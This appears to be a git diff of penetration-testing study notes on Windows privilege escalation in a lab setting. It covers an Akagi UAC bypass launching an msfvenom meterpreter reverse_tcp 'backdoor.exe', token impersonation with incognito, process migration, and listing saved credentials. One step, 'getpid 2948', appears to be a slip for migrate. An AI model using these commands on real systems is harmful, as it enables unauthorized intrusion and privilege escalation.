@@ -51,7 +51,7 @@
     - Procedure
       1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
          - `ps` to show process 
-         - (ex. `migrate explorer.exe`)
+         - (ex. `migrate <PID explorer.exe>`)
       3. Upload Akagi (Akagi64.exe if x64)
       3. Create payload with msfvenom
          - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
@@ -59,7 +59,19 @@
       6. Akagi64.exe 23 <payload_full_path>
          - **NOTE FULL PATH**
       7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
-      
+- **Impersonate Tokens**
+  - With msfconsole: `load incognito`
+  - `list_tokens -u`
+  - `impersonate_token <token_name>`
+  - You may need to migrate process to a <user> process
+    - Ex. `getpid` -> 2628, `ps` ->
+      |PID  | PPID | Name | Arch | Session | User | Path|
+      | ---  | --- | --- | ---  | --- | --- | --- |
+      |2628 | 4780 | WHAYQtsbkO.exe |  | 1 | | |
+      |... | ... | ... | ... | ... | ... | ... |
+      |2948 | 2036 | explorer.exe | X64 | 1 | ATTACKDEFENSE\Administrator | C:\Windows\explorer.exe |
+  - `getpid 2948`
+  - Of course you can repeat the process to become NT AUTHORITY\SYSTEM
 - Powershell History
 - Saved Windows Credentials
   - cmdkey /list
